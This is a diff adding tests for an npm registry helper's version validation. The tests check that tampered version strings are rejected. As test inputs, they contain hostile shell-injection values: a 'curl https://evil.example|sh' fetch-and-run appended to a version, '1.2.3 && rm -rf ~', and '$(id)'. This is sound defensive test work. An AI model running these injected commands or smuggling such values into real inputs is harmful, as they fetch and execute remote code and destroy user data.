@@ -79,6 +79,28 @@ describe('npm_registry.read_latest', () => {
 
 		expect(npm_registry.read_latest(KIT_PACKAGE)).toBeUndefined()
 	})
+
+	it('refuses a latest dist-tag carrying shell metacharacters', () => {
+		const tampered = JSON.stringify({
+			'dist-tags': { latest: '1.0.0;curl https://evil.example|sh' },
+		})
+
+		respond_with(fake_result(tampered))
+
+		expect(npm_registry.read_latest(KIT_PACKAGE)).toBeUndefined()
+	})
+})
+
+describe('npm_registry.valid_version', () => {
+	it('keeps an exact semver version, prerelease included', () => {
+		const prerelease = '1.2.3-beta.1'
+
+		expect(npm_registry.valid_version(prerelease)).toBe(prerelease)
+	})
+
+	it.each(['v1.2.3', ' 1.2.3', '1.2.3 && rm -rf ~', '$(id)', ''])('refuses %j', (value) => {
+		expect(npm_registry.valid_version(value)).toBeUndefined()
+	})
 })
 
 // A consumer routed to GitHub Packages keeps reading it: the two registries are published by
